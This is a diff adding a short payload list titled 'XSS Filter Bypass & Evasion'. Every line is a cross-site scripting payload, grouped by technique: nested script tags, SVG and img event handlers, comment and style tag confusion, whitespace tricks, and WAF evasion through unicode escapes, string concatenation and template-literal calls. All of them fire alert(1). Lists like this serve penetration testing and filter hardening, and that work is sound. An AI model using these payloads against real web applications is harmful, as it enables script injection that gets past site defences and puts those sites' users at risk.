@@ -1,0 +1,21 @@
+# XSS Filter Bypass & Evasion
+
+# Tag & Attribute Bypasses
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert(1)</script>
+<svg/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+<img src=x:x onerror=alert(1)>
+
+# Comment & Whitespace Bypasses
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<script>/*--><script>alert(1)//*/</script>
+<img/src="x"/onerror=alert(1)>
+<img	src=x	onerror=alert(1)>
+
+# WAF Bypasses
+<svg/onload='v\u0061r\x20a=alert;a(1)'>
+<img src=1 onerror=window['ale'+'rt'](1)>
+<script>alert`1`</script>
+<script>setTimeout`alert\x281\x29`</script>
